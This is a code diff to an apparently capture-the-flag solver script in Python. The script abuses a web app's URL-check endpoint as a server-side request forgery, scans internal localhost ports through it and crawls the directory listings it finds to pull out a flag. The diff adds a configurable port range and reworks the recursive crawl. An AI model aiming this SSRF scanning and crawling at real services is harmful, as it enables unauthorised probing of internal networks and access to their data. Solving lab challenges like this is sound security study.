@@ -10,15 +10,15 @@ default_resp = "Does this look correct to you?"
 dir_pattern = r"href=&quot;[\w.-]+[/]*&"
 
 
-def port_scan():
+def port_scan(start, end):
     ports = []
     session = login()
-    print("Scanning Ports ...")
-    pbar = tqdm(total=65535, dynamic_ncols=True, miniters=700)
+    print(f"Scanning Ports: {start} - {end} ...")
+    pbar = tqdm(total=end + 1 - start, dynamic_ncols=True)
     rate = 30
     delay = 60 / rate
     last_req_time = time.monotonic() - delay
-    for i in range(1, 65536):
+    for i in range(start, end + 1):
         params = {"web": f"{localhost}{i}"}
         resp = session.get(validate_url, params=params)
         if resp.text != default_resp:
@@ -45,32 +45,31 @@ def ssrf(port):
     resp = session.get(validate_url, params=params)
 
     print(f"Traversing {localhost}{port}/ ...")
-    flag_path = traverse(session, port, resp)
-    print(f"Found a path containing flag info: {localhost}{port}/{flag_path}")
-
-    params = {"web": f"{localhost}{port}/{flag_path}"}
-    resp = session.get(validate_url, params=params)
-    flag = re.search(flag_pattern, resp.text).group(0)
-    print(f"Flag Found!\n{flag}")
+    flag = traverse(session, port, resp)
+    if flag is not None:
+        print(f"Flag Found!\n{flag[0]}")
+        print(f"Path: {localhost}{port}/{flag[1]}")
+    else:
+        print(f"No flag found.")
     session.close()
 
 
 def traverse(session, port, response, path=""):
+    if re.search(flag_pattern, response.text) is not None:
+        return re.search(flag_pattern, response.text).group(0), path
+
     sub_dirs = re.findall(dir_pattern, response.text)
-    if "flag" in response.text:
-        for sub_dir in sub_dirs:
-            if "flag" in sub_dir:
-                return path + sub_dir[11:-1]
-    else:
-        for sub_dir in sub_dirs:
-            sub_dir = sub_dir[11:-1]
-            params = {"web": f"{localhost}{port}/{path}{sub_dir}"}
-            resp = session.get(validate_url, params=params)
-            res = traverse(session, port, resp, path + sub_dir)
-            if res is not None:
-                return res
+    for sub_dir in sub_dirs:
+        sub_dir = sub_dir[11:-1]
+        params = {"web": f"{localhost}{port}/{path}{sub_dir}"}
+        resp = session.get(validate_url, params=params)
+        res = traverse(session, port, resp, path + sub_dir)
+        if res is not None:
+            return res
     return None
 
 
-suspicious_ports = port_scan()
-ssrf(8873)
+# suspicious_ports = port_scan(1, 65565)
+
+# 8873, 55665
+# ssrf(8873)
